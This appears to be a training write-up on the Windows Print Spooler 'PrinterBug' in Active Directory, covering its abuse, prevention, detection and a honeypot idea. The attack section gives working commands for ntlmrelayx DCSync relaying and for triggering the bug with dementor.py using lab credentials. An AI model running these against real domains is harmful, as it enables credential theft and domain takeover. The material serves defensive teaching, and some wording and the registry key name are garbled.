## Description

The [Print Spooler](https://learn.microsoft.com/en-us/windows/win32/printdocs/print-spooler) is an old service enabled by default, even with the latest Windows Desktop and Servers versions. This became a popular attack vector because the functions [RpcRemoteFindFirstPrinterChangeNotification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b8b414d9-f1cd-4191-bb6b-87d09ab2fd83) and [RpcRemoteFindFirstPrinterChangeNotificationEx](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d) can be abused to force a remote machine to perform a connection to any other machine it can reach.
The impact of PrinterBug is that any DC that has the Print Spooler enabled can be compromised in one of the following ways:
1. Relay the connection to another DC and perform DCSync (if SMB Signing is disabled).
2. Force the DC to connect to a machine configured for Unconstrained Delegation, which will cache the TGT and can be captured with tools like Rubeus and Mimikatz.
3. Relay the connection to Active Directory Certificate Services to obtain a certificate for the DC.
4. Relay the connection to configure Resource-based Kerberos Delegation for the relayed machine.

## Attack

Here, we will relay the connection to another DC and perform DCSync.
To begin, we will configure NTLMRelayx to forward any connections to DC2 and attempt to perform the DCSync attack (on kali).
```bash
impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
```

Next, we need to trigger the PrinterBug, using [Dementor](https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py) with Bob (assuming it has been compromised already).
```bash
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```

Switching back to the NTLMRelayx terminal session, we will see that it was successful.

## Prevention

Print Spooler should be disabled on all servers that are not printing servers.
Additionally, there is an option to prevent this abuse while keeping the service running: when disabling the registry key _RegisterSploolerRemoteRpcEndPoint_, any incoming remote requests get blocked.

## Detection

The traces of the network connections toward the DC are too generic to be used as a detection mechanism.
In the case of using NTLMRelayx, no event ID 4662 is generated; however, to obtain the hashes as DC1 from DC2, there will be a successful logon event for DC1, originated from the kali's IP address.
A suitable detection mechanism always correlates all logon attempts from core infrastructure servers to their respective IP addresses which should be static and known.

## Honeypot

It is possible to use that as means of alerting on suspicious behavior, by outbounding connections from our servers to ports 139 and 445. The firewall rules will disallow the reverse connection to reach the threat agent.
While this may seem suitable, the bug requires the machine to connect back to us, but if a but is discovered which allows for some type of RCE without the reverse connection, then this will backfire on us.
